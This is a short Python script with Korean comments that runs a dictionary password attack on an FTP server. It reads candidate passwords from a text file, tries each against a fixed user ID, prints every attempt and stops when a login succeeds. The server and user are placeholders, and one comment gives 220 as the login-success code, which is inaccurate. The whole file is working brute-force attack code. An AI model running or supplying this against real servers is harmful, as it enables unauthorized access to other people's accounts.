from ftplib import FTP

table = open('비밀번호 테이블.txt','r')
userId = "아이디"

#FTP는 로그인 실패하면 530user cannot log in 메시지를 / 성공하면 220 User logged in 메시지가 출력된다
#파이썬에서는 예외처리를 하기떄문에 밑처럼 예외처리해준다
def getPassword(password):
    try:
        ftp = FTP("server")#인자로 도메인이나 아이피 들어가면된다.
        ftp.login(userId,password)
        print("비번:%s"%password)
        return True
    except Exception:
        return False


pwd = table.readlines()
for password in pwd:
    password = password.strip()
    print("대입 시도한 비번:%s"%password)
    if(getPassword(password)): #만약 입력한 비번이 맞으면 True가 리턴되니까 브레이크!
        break
table.close()
